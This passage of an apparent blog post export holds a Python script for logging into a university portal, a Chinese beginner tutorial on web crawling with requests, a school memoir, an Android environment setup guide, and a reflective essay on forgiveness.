&#x27;condition_xnd&#x27;: &#x27;2014-2015&#x27;, &#x27;condition_xq&#x27;: &#x27;2&#x27;, &#x27;condition_kclb&#x27;:&#x27;&#x27;, &#x27;condition_spbz&#x27;: &#x27;&#x27; &#125; r = self.s.post(self.url_myCourse,data=postData,headers=self.myheader) r.encoding=&#x27;gbk&#x27; print r.textruc = vRuc()#enter your username and passwordusername=&#x27;&#x27;password=&#x27;&#x27;ruc.startLogin(username, password)ruc.getMyCourse()#ruc.getScore() 使用urllib的老版本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# -*- coding: utf-8 -*-# author:hrwhisper# date :2015.3.17import urllibimport urllib2import reimport cookielib class vRuc: url_token = &#x27;https://uc.tiup.cn/account/login?client_id=uc.tiup.cn&amp;redirect_uri=%2Foauth%2Fauthorize%3Fclient_id%3Duc.tiup.cn%26redirect_uri%3Dhttp%253A%252F%252Fv.ruc.edu.cn%252Fsso%252Flogin%253Fredirect_uri%253D%25252FUser%2526school_code%253Druc%2526theme%253Dschools%26response_type%3Dcode%26school_code%3Druc%26scope%3Dall%26sso%3Dtrue%26state%3DZ08-C1r99RVtBwYVkEm12XxfhvVlW680YDKwfAaPU1DG-_mx%26theme%3Dschools&amp;response_type=code&amp;school_code=ruc&amp;scope=all&amp;sso=true&amp;state=Z08-C1r99RVtBwYVkEm12XxfhvVlW680YDKwfAaPU1DG-_mx&amp;theme=schools&#x27; url_login = &#x27;https://uc.tiup.cn/account/login&#x27; url_redirect =&#x27;https://uc.tiup.cn/oauth/authorize?client_id=uc.tiup.cn&amp;amp;redirect_uri=http%3A%2F%2Fv.ruc.edu.cn%2Fsso%2Flogin%3Fredirect_uri%3D%252FUser%26school_code%3Druc%26theme%3Dschools&amp;amp;response_type=code&amp;amp;school_code=ruc&amp;amp;scope=all&amp;amp;sso=true&amp;amp;state=vhfL6zHS_J4cH88Z_A-ZHl7RIUxmPrZEnffvYdtsCf7tWpz7&amp;amp;theme=schools&#x27; url_score = &#x27;http://app.ruc.edu.cn/idc/education/report/xscjreport/XscjReportAction.do?method=printXscjReport&amp;xh=&#x27; url_myCourse=&#x27;http://app.ruc.edu.cn/idc/education/selectcourses/studentselectcourse/StudentSelectCourseAction.do&#x27; cookie = cookielib.CookieJar() opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie)) def startLogin(self,username,password): self.login(self.getToken(),username,password) self.redirect() def getScore(self): request = urllib2.Request(self.url_score) response = self.opener.open(request) print response.geturl() html = response.read() print html.decode(&#x27;gbk&#x27;) def redirect(self): request = urllib2.Request(self.url_redirect) self.opener.open(request) def login(self,csrf_token,username,password): postData = &#123; &#x27;csrf_token&#x27; : csrf_token, &#x27;school_code&#x27; : &#x27;ruc&#x27;, &#x27;username&#x27;: username, &#x27;password&#x27;: password, &#x27;remember_me&#x27; : &#x27;true&#x27; &#125; postData = urllib.urlencode(postData) loginRequest = urllib2.Request(self.url_login,data=postData) self.opener.open(loginRequest) def getToken(self): request = urllib2.Request(self.url_token) self.opener.open(request) csrf_token=&#x27;&#x27; for item in self.cookie: if item.name==&#x27;csrf_token&#x27;: csrf_token= item.value return csrf_token def getMyCourse(self): postData = &#123; &#x27;method&#x27;: &#x27;queryXkjg&#x27;, &#x27;isNeedInitSQL&#x27;: &#x27;true&#x27;, &#x27;xnd&#x27; :&#x27;2014-2015&#x27;, &#x27;xq&#x27;: &#x27;2&#x27;, &#x27;condition_xnd&#x27;: &#x27;2014-2015&#x27;, &#x27;condition_xq&#x27;: &#x27;2&#x27;, &#x27;condition_kclb&#x27;:&#x27;&#x27;, &#x27;condition_spbz&#x27;: &#x27;&#x27; &#125; postData = urllib.urlencode(postData) request = urllib2.Request(self.url_myCourse,data=postData) print self.opener.open(request).read().decode(&#x27;gbk&#x27;)ruc = vRuc()#enter your username and passwordusername=&#x27;&#x27;password=&#x27;&#x27;ruc.startLogin(username, password)ruc.getMyCourse()","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://www.hrwhisper.me/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"python 爬虫 入门","slug":"python-web-crawler-instruction","date":"2015-03-15T14:31:34.000Z","updated":"2020-10-22T14:59:55.587Z","comments":true,"path":"python-web-crawler-instruction/","link":"","permalink":"https://www.hrwhisper.me/python-web-crawler-instruction/","excerpt":"用 python 爬虫 来爬取网页信息是非常方便的！ 开始玩爬虫，咔嚓咔嚓~ 小虫子，大虫子，你怕不怕！","text":"用 python 爬虫 来爬取网页信息是非常方便的！ 开始玩爬虫，咔嚓咔嚓~ 小虫子，大虫子，你怕不怕！ ps:Python版本2.78. 本文由hrwhisper原创，转载请点明出处（https://www.hrwhisper.me/?p=1100） 2015.5.3更新: 不再使用urllib，改用更为简洁、速度更快的requests。 一、课前准备 （一）爬虫技术简介 什么是网络爬虫？ 百度百科上这么写：网络爬虫（又被称为网页蜘蛛），是一种按照一定的规则，自动的抓取万维网信息的程序或者脚本。另外一些不常使用的名字还有蚂蚁，自动索引，模拟程序或者蠕虫。 通俗的说，就是获取网页内容的技术。比如，网页中的文字、图片。 它还可以从一个网页到另外一个网页（广搜、深搜等），就像在互联网这个大蜘蛛网上爬来爬去一样。 可以说，就是爬取网页的源代码，从中获取我们需要的内容。（如文字、图片、其他文件等） （二）HTTP通信过程 Http是一个基于请求/响应模式的，无状态的协议，它是建立在TCP的基础上的。 具体过程如下： 建立TCP连接 Web浏览器向Web服务器发送请求 Web浏览器发送请求头信息 Web服务器应答 Web服务器发送应答头信息 Web服务器向浏览器发送数据 Web服务器关闭TCP连接 简单的说，就是 建立TCP连接 浏览器发送请求 服务器回应请求 关闭TCP连接 （三）URL和URI Web上可用的每种资源 -HTML文档、图像、视频片段、程序等 都由 由一个统一资源标识符（Uniform Resource Identifier, 简称\"URI\"）进行定位。 URL：统一资源定位符 URI：统一资源标识符 URL是URI的一个子集。URL必须指明如何获取这个资源。如HTTP，FTP等 二、python简单的爬虫 （一）最简单的网页爬虫 一个简单的爬虫如下： 回想一下刚才介绍的HTTP的通信过程，我们用get方法发送request请求，而它将返回一个response，这个response对象的text即为html源代码 123import requestsresponse &#x3D; requests.get(&#39;http:&#x2F;&#x2F;hrwhisper.me&#39;)print response.text （二）get和post http中，不得不说的就是get和post. 简单的说，get就是通过url把参数发给服务器，而Post是写在header中的。 get简单的实现，即在Url后加参数。 PS:在下面这两个例子，仅仅是例子而已，直接运行会出错，因为服务器不认你的。在实际应用中，请把url改成你需要的。 GET例子： 1234567import requestsdata &#x3D;&#123; &#39;name&#39;:&#39;hrwhisper&#39;, &#39;blog&#39;:&#39;hrwhisper.me&#39;&#125;r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;hrwhisper.me&#39;,params&#x3D;data)print r.text POST例子： 12345678# -*- coding: utf-8 -*-import requestsdata &#x3D;&#123; &#39;name&#39;:&#39;hrwhisper&#39;, &#39;blog&#39;:&#39;hrwhisper.me&#39;&#125;r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;hrwhisper.me&#39;,data&#x3D;data)print r.text 可以看出： 要使用get方法，requests.get，参数为params 要使用post方法，requests.post，参数为data 对于 像12306这种证书错误或无效的的，直接get报错，怎么办呢？ 把参数verify改为false即可 12r &#x3D; requests.get(&#39;https:&#x2F;&#x2F;kyfw.12306.cn&#x2F;otn&#x2F;login&#x2F;init&#39;, verify&#x3D;False)print r.text （三）通过设置header 伪造浏览器 我们来抓取下刚才post发出的包，可以看到User-Agent：Python-urllib/2.7 [caption id=\"attachment_1106\" align=\"alignnone\" width=\"362\"] python post抓包[/caption] User-Agent是什么呢？这是一个用来用户浏览器的标识。 比如 我的chrome浏览器的 User-Agent如下： Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36 Firefox如下： Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 而往往有机智的服务器看到你只是个小蜘蛛，它果断不为你提供服务。 所以我们需要进行头部的伪装。 代码很简单，只要简单地传递一个 dict 给 headers 参数就可以了。(post和get都只需要加入headers属性！) 1234567891011# -*- coding: utf-8 -*-import requestsdata &#x3D;&#123; &#39;name&#39;:&#39;hrwhisper&#39;, &#39;blog&#39;:&#39;hrwhisper.me&#39;&#125;myheader&#x3D;&#123; &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 6.3; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;41.0.2272.89 Safari&#x2F;537.36&#39;&#125;r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;hrwhisper.me&#39;,data&#x3D;data,headers&#x3D;myheader)print r.text 我们再看看包，可以看到已经变成了chrome~ 设置了header之后 当然，服务器可能还有许许多多的验证，如用referer来设置防盗链，我们也只需要加入头部即可。 如果你不知道要加入什么，最简单的办法就是用正常的浏览器去访问页面，抓包，然后头部抄正常浏览器的即可！ （四）Cookie cookie是什么呢？ 在程序中进行会话跟踪是很正常的一件事情，而我们知道，http是一个无状态的协议，一旦客户端和服务器交换完数据，连接就关闭，再次交换数据需要建立新的连接。这意味着服务器无法跟踪会话。 而cookie就是一个用于帮助跟踪会话的东西。 cookie的一个常用应用就是可以放入你的登陆信息，让你下次访问时不必重新输入用户名密码进行登陆。 需要注意的是它有不可跨域名性，即浏览器访问hrwhisper.me只会携带hrwhisper.me的cookie，不会携带baidu或者google的。（二级域名可以通过设置进行访问，默认情况下是不行的） XSS攻击称为跨站脚本攻击，可以用来盗取别的域名的cookie。 好吧扯远了。 比如说，爬虫需要访问的内容，它需要登陆后才能进行访问，我们就需要使用到cookie记录我们登陆的信息。 一个简单的cookie使用如下，关建行我已经高亮标出来。 我们可以创建一个session对象，并且用这个session对象进行发送post或者get， Cookie的事情我们就不用管他了，可以自动的实现创建发送等。 而这个session对象的使用和前面的requests使用是一模一样的。 （具体的登陆后面我会有样例） 123456789101112# -*- coding: utf-8 -*-import requestsdata &#x3D;&#123; &#39;name&#39;:&#39;hrwhisper&#39;, &#39;blog&#39;:&#39;hrwhisper.me&#39;&#125;myheader&#x3D;&#123; &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 6.3; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;41.0.2272.89 Safari&#x2F;537.36&#39;&#125;s &#x3D; requests.Session()r &#x3D; s.post(&#39;http:&#x2F;&#x2F;hrwhisper.me&#39;,data&#x3D;data,headers&#x3D;myheader)print r.text 要拿出某个cookie的话，可以类似dict一样直接进行访问。 1234567&gt;&gt;&gt; url &#x3D; &#39;hrwhisper.me&#39;&gt;&gt;&gt; r &#x3D; requests.get(url)&gt;&gt;&gt; r.cookies[&#39;example_cookie_name&#39;]&#39;example_cookie_value&#39; （五）响应状态码 1234# -*- coding: utf-8 -*-import requestsr &#x3D; requests.get(&#39;http:&#x2F;&#x2F;hrwhisper.me&#39;)print r.status_code （六）其他技巧 1.通过geturl()获取真实网址 - geturl() 一个网址可能被重定向到另外一个网址，比如Lofter首页上你自定义的外站连接。 如：http://hrsay.lofter.com/hrwhisper 就被重定向到https://www.hrwhisper.me/ 我们怎么获取真实的网址呢？很简单，直接用返回的对象的url属性即可 123import requestsr &#x3D; requests.get(&#39;http:&#x2F;&#x2F;hrsay.lofter.com&#x2F;hrwhisper&#39;)print r.url 你会看到，输出为： https://www.hrwhisper.me/ 2.查看获取页面的信息 - headers 查看页面的响应头 12345# -*- coding: utf-8 -*-import requestsr &#x3D; requests.get(&#39;http:&#x2F;&#x2F;hrsay.lofter.com&#x2F;hrwhisper&#39;)print r.headers#print r.headers[&#39;content-type&#39;] 返回的是一个字典，你可以直接取出相应的字段 123456789101112&#123;&#39;content-length&#39;: &#39;9321&#39;, &#39;content-encoding&#39;: &#39;gzip&#39;,&#39;vary&#39;: &#39;Accept-Encoding,User-Agent&#39;, &#39;keep-alive&#39;: &#39;timeout&#x3D;2, max&#x3D;100&#39;, &#39;server&#39;: &#39;Apache&#x2F;2&#39;, &#39;connection&#39;: &#39;Keep-Alive&#39;,&#39;date&#39;: &#39;Sun, 03 May 2015 06:45:58 GMT&#39;,&#39;content-type&#39;: &#39;text&#x2F;html;&#39;charset&#x3D;&#39;UTF-8&#39;, &#39;x-pingback&#39;: &#39;https:&#x2F;&#x2F;www.hrwhisper.me&#x2F;xmlrpc.php&#39;&#125; 接下来你可以学习： python模拟登陆 python 爬虫之模拟登陆实战（一）微人大 python 爬虫之模拟登陆实战（二）百度 从网页中得到想要的信息。（我的例子都是HTML） python正则表达式 python beautifulsoup 参考资料： http://www.python-requests.org/en/latest/user/quickstart/#post-a-multipart-encoded-file","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://www.hrwhisper.me/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"『记忆与印象』刻在骨髓里的地方","slug":"memory-about-my-middle-school","date":"2015-03-15T08:47:51.000Z","updated":"2020-10-19T14:35:48.809Z","comments":true,"path":"memory-about-my-middle-school/","link":"","permalink":"https://www.hrwhisper.me/memory-about-my-middle-school/","excerpt":"初中毕业六年，而我再也没有回去过，而再也回不去。 我们就好像写在纸上的铅笔画，可以被时光轻易的擦去，而唯有那些‘刻骨’，那些‘铭心’的，才是对时光最好的抵抗。","text":"初中毕业六年，而我再也没有回去过，而再也回不去。 我们就好像写在纸上的铅笔画，可以被时光轻易的擦去，而唯有那些‘刻骨’，那些‘铭心’的，才是对时光最好的抵抗。 城市化的建设上，先拆后建。 于是，你会看见，一些房子外包着木架和防尘网，像是包扎的纱布。 整个城市都是伤口，整个城市在哀鸣。 人们熟悉的小巷不见了，那些低矮的楼房，那些长满沥青的小路，全都不见了， 人们的童年、记忆的风景，全部都不见了。 世界绝大多数事情，与你无关，所以你觉得无关痛痒。 然而，这一次我的学校也不见了。 （一） 小学毕业的时候，自主招生？嗯，觉得没必要啊。 妈妈让我来了华侨中学，也就是四中。 这是一个不大的校园，走进学校大门，你会看见中间一栋大楼（相对的大），那是孙江楼，旁边是两栋教学楼，下面是250米的跑道和几个篮球场。再往下看，你也许会看见校长在那站着抓头发长的、改裤子的。 嗯，我推着车，无视了他，上了旁边长长的斜坡，左转，放进车库。 车库中，有几条栏杆，可以从那栏杆直接爬到科技楼二楼，上音乐课的时候我们常常这么走近道。 车库的西面是厕所，北面是教室。 教室里有什么呢？前后的两个黑板，不新的课桌，没有电脑。 沿着操场东面，是教师的宿舍楼。因为爱玩，英语听写不过关，常常中午会被请去那背诵。 没有图书馆，没有自习室。 这是我印象中的校园，那时没有手机，发现一张校园的样子都没有留下。 不免可惜。 （二） 那年，我初一。 初一的时候，家里，刚买电脑，天天在研究电脑，比如，怎样防毒啊，防火墙、杀毒软件一个都不能少，甚至多装卡死都有发生。 和老爸吵架的时候，删除他所有的收藏夹。和好后在还原回去。 当然，也和邻居一起在玩网游，《武林外传》，到今天我还记得，那个游戏曾给我们的快乐，刀光血影，就像一场江湖。当然我也丢进去不少银子，最后发现这是给有钱人玩的游戏，果断退出。 那时候讨厌英语，单词都不背，每次听写的时候都偷看课本，好景不长，被英语老师（下面称林先）发现，然后被罚抄一百遍。 罚抄？一种无能而幼稚的途径。手握两支笔，这样只要写50遍，但我拿了三只笔。好在老师不嫌字丑。 不能偷看，于是只好背起了单词。 最糟糕的是那时候不怎么看清黑板，又没戴眼镜（我那时大概在第五排），所以在学One two ~ ten的时候，老师写数字在黑板上，随便指个让我们快速反应出英文发音。我只能根据位置判断那数字是几，然后在想想读啥。所以结果总是略慢，当然这是谁也不知道的秘密。 那时候天天玩，晚上时常是看电视，好像还在看什么动画片。几乎不读书。 尽管这样，初一的时候我还是，年级十六，班级第一。 （三） 那年，我初二。 初二的时候是物理开始上了，爸妈啊老师啊，都在危言耸听：物理很难啊什么的。 当然，我还是照旧的玩。 当然那一整年都没考好，班主任（李先）开始在一旁冷嘲热讽：我早就说物理出来你就不行了。 而原因不是物理，某些科目一时没考好而已。我对自己这么说。 初二的时候开始和叶B还有 7元玩在一起，还一起去网吧玩魔兽争霸。网吧是在学校的不远处，我们叫它科星。 科星是个黑网吧，里面不大，十几台电脑，上机的都是我们初中生，和老板也比较熟。 也没有令人讨厌的烟味,只有一群小孩子们，欢声笑语。 初二下学期的某一天， 我已记不清那是几月几号，是不是在自习。我只记得，那天前一秒我还在和面包（HWL）谈论着沸点，后一秒，坐我右边同坐第一排的女孩ZXJ突然转过来对我说“yhr,我喜欢你” 我还没回过神来——XJ，她是班花，她喜欢我？我和她又不熟，在逗我吧。 果然，她下一秒转过去对啊宜说，“看到了没”。 之后，和她玩得比较好的面包说‘要吐了‘ ，我也跟着说。 之后四个人又聊了些什么，我不记得了。 然而，那不是个玩笑，她也没有在逗我。 我记得，去打扫办公室的时候，只剩我们两个的时候，她看我的眼神，含情脉脉的眼神。 我记得，开家长会的时候，我爸说，有个很漂亮的女孩问他你是yhr的家长吧。 …… 但我不能，因为我看不见自己的未来。 （四） 初三那年。 班上来了新同学，是原来4班（还是5班？）拆掉了的同学。 他们当然对拆掉自己的班级心存不满，可是，抗议无效，只能“寄人篱下”。 我和班主任之间的间隙越来越大。 一次作文，现在我已经忘记那个题目是什么了。 我只记得，我写了一个和我一起骑车爬上坡的老人(他的笑容我至今都还记得）, 要知道，我骑车的速度是很快的，而他却能追上我，而且是上坡，还冲着对我笑，竖起大拇指。 我大概是想说这是一种精神。 而李先在评价我们这次写的作文的时候，一个个的批斗，然后说‘yhr更荒谬了，写了个什么老人’那时候我再也不想理他。 之后有一次布置作文，大家都说要不要写的时候，我说，我才不给不会欣赏的人看。 于是那一次几乎没有什么人交。 一次班级的考试，我忘了写名字，他说：最好中考也忘记写。 看我浑浑噩噩的样子，他当着全班的面说：你要是语文能拿到A，我就从孙江楼上跳下去！ 我那时候心想，切，我还怕我拿A你跳下去了。 中考的时候，我确实拿到A了。 他虽然没有跳下去，但也慢慢的走上了奈何桥。 高二的时候，得知他得了重病，和同学们自发的去看他。 却也没想到，那就是最后一次。 高考后五个月，他终于向尘世间撒手人寰。 也许知道我们的成绩不算太差，也就了却了自己的心事。 而我终于明白，再也不会有个用恨铁不成钢的声音，满嘴恶语，确实希望你过得好的。 而我终于明白，再也不会有个人以那样的方式批评你，骂得你体无完肤，心生惧意。 你得是多么的年轻，才会觉得，那些说话好听的，才是为你好的。 你是要什么时候才会明白，恶语相向的，未必不是良药苦口的。 我用了整整的一年初三明白的那些道理。 有的人，嘴毒，却良药苦口。 你不努力，所以活该只差一分，所以你活该上一个不好的高中。 （五） 时光多残忍， 那些微笑着说要一起加油的人都不见了， 那个每次都恶狠狠的骂着你恨铁不成钢的李老师也不见了， 那个校服我都忘了是什么模样了， 那个我们跑步的跑道， 那几个放学后打球的篮球场， 那个每周一的升旗台， 甚至，就连那栋教学楼，最后都只剩下了一片废墟了。 而我再也回不到那熟悉的教室，那个教学楼，那个学校， 但我已经六年没有回去的这个记录，只会随着时间而无限的放大，没有开关，没有任何逻辑可言，它，根本停不下来。 人，在废墟的面前会想些什么呢？ 我承认，当我在圆明园的那一片废墟面前，我感受不到那些历史的悲哀，我不想故作矫情，意淫自己是多么难过来体现自己多么爱国。在我眼前，只有游客们欢声笑语，争着和废墟合照。而我也不能免俗，趁着没人，也让人给我拍了几张。 而我，却不敢去学校的遗骸前望上一眼。 那些在你生命中留下印记的人和事，只有你才会觉得是弥足珍贵的东西。 圆明园，被写进了历史，而我的学校呢，只会像被拆掉的许许多多的建筑，最后被人遗忘。 春秋永远只转载要事。而它们，却只能刻在我们的骨子里，抹不掉，擦不去，这或许是和时间做的，最好的抵抗。 蔡崇达我一直以为他是惠安人。 我是在晋江长大的孩子，每次回老家一切都是那么陌生。看《皮囊》的时候我深切体会到农村生活的感受会是多么的相似，那些闽南的风俗，那些闽南的习惯，那些情感，那些生活。 “一定不要像断了线的风筝，没了家乡，却也到不了远方，最后成了在人世间漂泊的孤魂野鬼。” 下一个被拆掉的东西是什么，或者，下一个和你告别的重要的人和事是什么？ 我不知道，我内心忐忑，我想抓住时间的缝隙。 如果要告别，那就用力一点； 如果能挽回，那我就去抓住。 仅以此文，纪念再也回不去的母校，还有入土为安的李先，也提醒我，无论做什么，尽最大的努力去做，才能不留遗憾。 虽然说谁都可以说自己没有遗憾，但是，努力和不努力的差别在于，前者心安理得，后者自欺欺人。 现在我在图书馆四楼，打开窗户，能感到空气的清爽，阳光正好，我也很好。 By hrwhisper 2015.3.15 -THE END- 附录 在google earth上看到的。 四周已是高楼大厦，俯瞰着这曾经是学校的地方。 可以看到，就剩下中间的孙江楼。 其余基本拆完了。 跑道估计很快也会。。 说不定已经拆完了。（毕竟google earth 不知道多久才更新一次） image-20201012223302166","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"Java和Android开发环境配置 || 使用genymotion模拟器","slug":"java-android-environment-genymotion-emulator","date":"2015-03-13T11:37:50.000Z","updated":"2020-10-19T14:35:48.745Z","comments":true,"path":"java-android-environment-genymotion-emulator/","link":"","permalink":"https://www.hrwhisper.me/java-android-environment-genymotion-emulator/","excerpt":"目录如下 java环境配置 安卓环境配置（不科学上网下载SDK）及第一个hello world程序 使用genymotion模拟器！ 使用Intel HAXM加速Android 模拟器（不推荐）","text":"目录如下 java环境配置 安卓环境配置（不科学上网下载SDK）及第一个hello world程序 使用genymotion模拟器！ 使用Intel HAXM加速Android 模拟器（不推荐） 更新下安卓配置的教程。 最近软件工程要开发个安卓。无奈手机是windows phone，传说中被支付X提到的那百分之一的生活。 安卓模拟器卡爆了，发现可以加速，于是决定更新下教程。 PS：部分图片直接摘自我的CSDN 一、java环境配置 一、安装JDK 为啥要安装JDK就不说了吧？java写安卓。。 传送门： http://www.oracle.com/technetwork/java/javase/downloads/index.html 安装完后，配置环境变量： 右击 “我的电脑”-&gt;属性-&gt;高级-&gt;环境变量-&gt;系统变量-&gt;新建 第一步： 变量名：JAVA_HOME 变量名：C:.0_10 （注意这里是你的JDK安装目录） 第二步： 变量名：classpath 变量值：.;%JAVA_HOME%;%JAVA_HOME%.jar 20140714060254675 第三步： 变量名：Path 变量值：%JAVA_HOME%;%JAVA_HOME% (变量值中如果有内容，用;隔开) 20140714060310914 如果环境变量配置好了， WIN+R弹出运行窗口，输入JAVAC后打印一些东西然后自己退出。 二、安卓环境配置及第一个hello world程序 1.先安装SDK Manager 这个不用说吧。。。 2.下载需要的资源 （如果别人那有安卓SDK，建议直接拷贝，免去下载） SDK比较大而且下载很慢很慢，科学上网还是一样。 其实有国内的一些科研机构提供了镜像下载。 IPv4: http://ubuntu.buct.edu.cn/ IPv4: http://ubuntu.buct.cn/ 打开SDK Manager ，点击菜单栏tools - options弹出设置如图： QQ截图20150313194220 这样，从国内的下载速度就快多了～ 3. 安装ADT ADT即Android Development Tools 安卓 开发的一个工具。 可以从http://download.csdn.net/detail/murmured/7605937 下载 在eclipse下安装步骤： Help-&gt;Install new Software-&gt;Add-&gt;Archive-&gt;找到ADT-22.0.1.zip(上面的名称随意)-&gt;勾选Developer Tools-&gt;一路next 4、匹配虚拟设备（AVD） 打开AVD（Android Virtual Device）（这个刚才和SDK Manager一起装的。) 一开始进去肯定是没有东西的，点击右边的New按钮。 我是这么配置的： SD 卡会在系统里生成一个同等大小的文件，用来模拟SD 卡。。。所以不要太大你懂的。 还有就是有个RAM，你写多大，那么你的安卓内存就多大，你系统内存也会被占用那么大。 target是安卓系统的版本，现在不推荐使用2.3了，请自行修改。 20140707232823000 点ok即可 ５．接下来创建第一个安卓程序 打开eclipse， File -&gt; New -&gt; Android Application Project 其中Minimum Required sdk 选择4.0以上版本（可以避免appcompat_v7_2报错） QQ截图20150510203614 接下来一路Next到此处界面，选择Empty Activity 不出意外的话是不会报错的 QQ截图20150510204625 右击hello world -&gt;Run As-&gt;Run Configuration： 它就会出现 QQ截图20150510205313 耐心等。开机后就出现了hello world!字样！！！ QQ截图20150510204839 三、使用Genymotion模拟器 安卓自带的模拟器卡爆了，即使是使用了HAXM加速后还是一样！ 特别是高分屏的时候！ 接下来介绍genymotion模拟器，官网地址：http://www.genymotion.net/ 注册下载安装genymotion模拟器 Help &gt; Install new software &gt; Add. 网址填上 http://plugins.genymotion.com/eclipse/ location 名称Genymotion 安装完后重启eclipse即可。 genymotion 下载相应的机型我就不说了，大家都懂。 eclipse 连接genymotion 方法： 必须先开eclipse 后启动模拟器。 像使用普通的安卓模拟器使用即可。 genymotion 安装普通的APK可以直接拖入安装。（QQ我可以运行于google nexus S android4.1上~） 四、使用Intel HAXM加速Android 模拟器 觉得自带安卓模拟器卡爆了？（推荐上面的第三步，使用genymotion模拟器） 没事，咱放大招！ 打开安卓sdk manager,查看extras下，你可以发现最后一个，是intel x86 emulator Accelerator.（如果没有，请把下载地址改为ubuntu.buct.edu.cn，参考上面的安卓环境配置） 下载它！ 下载完后进入 android-sdk_Accelerated_Execution_Manager , 运行 IntelHaxm.exe 进行安装。 QQ截图20150313194845 接下来你就会在模拟器中看见各种Intel x86 atom的系统镜像，下载它。 QQ截图20150313195308 下载安装后，打开AVD manager，新建/编辑虚拟机如图（如果是编辑，之后第一次打开虚拟机记得清除下用户数据），CPU只要是Intel的即可。 QQ截图20150313195442 好了，体验健步如飞的速度吧！","categories":[{"name":"开发环境/开发工具","slug":"开发环境-开发工具","permalink":"https://www.hrwhisper.me/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://www.hrwhisper.me/tags/Android/"},{"name":"环境配置","slug":"环境配置","permalink":"https://www.hrwhisper.me/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}]},{"title":"原谅","slug":"forgive-her-hurt-me","date":"2015-03-10T13:15:14.000Z","updated":"2020-10-19T14:35:48.732Z","comments":true,"path":"forgive-her-hurt-me/","link":"","permalink":"https://www.hrwhisper.me/forgive-her-hurt-me/","excerpt":"不知怎么，就听这首歌听了一整天。","text":"不知怎么，就听这首歌听了一整天。 原谅把你带走的雨天 在突然醒来的黑夜 发现我终于没有再流泪 原谅被你带走的永远 时钟就快要走到明天 痛会随着时间好一点 ——《原谅》张玉华 一学妹问，最近好吗。 我说还好啊。 聊着聊着，她说 那你，还喜欢她吗—— 你会不会觉得， 有时候，一个问句， 在你看来， 就像是一个锥心的问号， 叩响整个心门。 于是， 周围的一切仿佛都寂静了， 天地间仿佛就剩下你一个人。 我曾想要， 埋藏那些记忆， 埋在阳光看不见的阴影， 埋在没有花香，寸草不生的土地， 埋在永远干涸而裂开的土地， 在上面在加一层厚厚的沙， 然后狠狠的踩上两脚。 甚至决定抹杀一切存在过的痕迹。 只因， 那天，电话对面悠悠的传来——“哪位” 只因， 那天，电话对面的那句“别再给我送东西了。” 于是我开始记恨上， 如果这样能让自己好受的话， 如果去恨可以因此忘记的话。 于是我开始恨上， 恨她总是不说， 恨她忽视我的时候， 恨她的一切一切。 然后想起的时候狠狠的在心里骂上两句， 开始带上有色眼镜去审视一个人。 于是我开始躲避， 不再对她进行备注， 这样就不会在别人的评论框里看见她的名字。 于是我开始否决， 从来就没有存在过那个人。 我开始怀疑， 以最坏的恶意揣测着， 一开始她来找我只是为了玩弄你的感情。 …… 我开始变得罪恶， 灵魂开始变得扭曲， 爱终于成了怨然后成了恨。 就像去折玫瑰， 因它冷酷的刺，戳伤了你的皮， 于是气急败坏然后恼羞成怒扬言要斩草除根。 愚蠢极了。 蔡崇达说， 他想看见更多的人。 写作的终极目的是看见。 看见更多的人。 看见自己的内心， 像是拿着手术刀的医生， 只不过，是把刀划向自己， 把心，再伤一遍。 你需要看见，看见坐在你对面的人， 是怎样的经历，经过岁月怎样的雕琢， 才是这样的长相、性格、想法和做法。 于是我把我的心解剖， 然后缝合。 把回忆放在阳光照不到的地方，不过是内心的阴影； 把记忆埋藏在寸草不生的土地，不过是内心的贫瘠。 世界上大多数的恨，都是来源于爱。 毕竟是我爱的人， 我能够怪你什么。 那么我就这么原谅。 原谅把你带走的雨天， 原谅被你带走的永远， 原谅了那些伤害， 原谅了那些我看起来的不在意， 原谅了她未尽到一个女友的责任…… 原谅了所有伤害过自己的人， 原谅了自己的恨。 于是我就这么原谅， 过去我犯下的， 别人对我犯下的， 所有的错误， 就这样一笔勾销。 阳光将所有的尘埃都染得纤毫耀眼， 只有自己的心，向阳， 才能开出美丽的花。 完成一次成长。 谁是你的太阳， 能让你围着它转动？ 从日暮到拂晓， 从晨曦到黄昏。 今天写了12题，还剩下7题。 从晚上竟然没有A掉一题， 因为有人提起的缘故么。 累，要休息了。 